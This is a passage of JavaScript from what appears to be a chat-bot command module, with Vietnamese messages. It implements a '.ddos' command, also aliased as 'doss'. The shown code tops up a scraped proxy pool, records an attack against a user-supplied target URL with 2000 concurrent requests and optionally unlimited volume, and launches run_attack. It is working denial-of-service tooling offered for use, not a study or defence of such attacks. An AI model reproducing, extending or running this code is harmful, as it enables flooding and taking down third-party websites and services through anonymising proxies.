        let poolStats = proxyPool.getStats();
        if (poolStats.total < MIN_PROXY_BEFORE_ATTACK) {
            ctx.api.sendMessage({
                msg: `⛏️ Pool chỉ có ${poolStats.total} proxy (cần ${MIN_PROXY_BEFORE_ATTACK}).\n` +
                    `🔄 Đang lấy ${AUTO_DIG_COUNT} proxy từ ${50} nguồn, vui lòng chờ...`
            }, ctx.threadId, ctx.threadType);

            await autoDigProxy(AUTO_DIG_COUNT);
            poolStats = proxyPool.getStats();

            if (poolStats.total < 1) {
                return ctx.api.sendMessage({
                    msg: `❌ Không lấy được proxy nào từ nguồn. Thử lại sau!`
                }, ctx.threadId, ctx.threadType);
            }
        }

        attack_threads.set(ctx.threadId, {
            running       : true,
            requests_sent : 0,
            requests_success: 0,
            start_time    : Date.now(),
            target_url,
            methodLabel   : methodInfo.label,
            num_requests,
        });

        poolStats = proxyPool.getStats();
        ctx.api.sendMessage({
            msg: `✔️ Bắt đầu tấn công!\n` +
                `🎯 Mục tiêu   : ${target_url}\n` +
                `⚙️ Phương thức : ${methodInfo.label}\n` +
                `📤 Tổng req   : ${num_requests === Infinity ? "∞ (không giới hạn)" : num_requests.toLocaleString()}\n` +
                `🌐 Proxy pool : ${poolStats.total} (tự lấy thêm khi < ${AUTO_DIG_THRESHOLD})\n` +
                `⚡ Concurrency : 2000 req song song\n` +
                `⏱️ Giới hạn   : ${num_requests === Infinity ? "∞ (chạy đến khi .ddos stop)" : "30 phút"}\n` +
                `💬 Dừng       : .ddos stop`
        }, ctx.threadId, ctx.threadType);

        run_attack(ctx, target_url, methodInfo, num_requests).catch(e => {
            log.error(`[DDOS] Lỗi: ${e.message}`);
            attack_threads.delete(ctx.threadId);
        });
    },
};

commands.doss = commands.ddos;
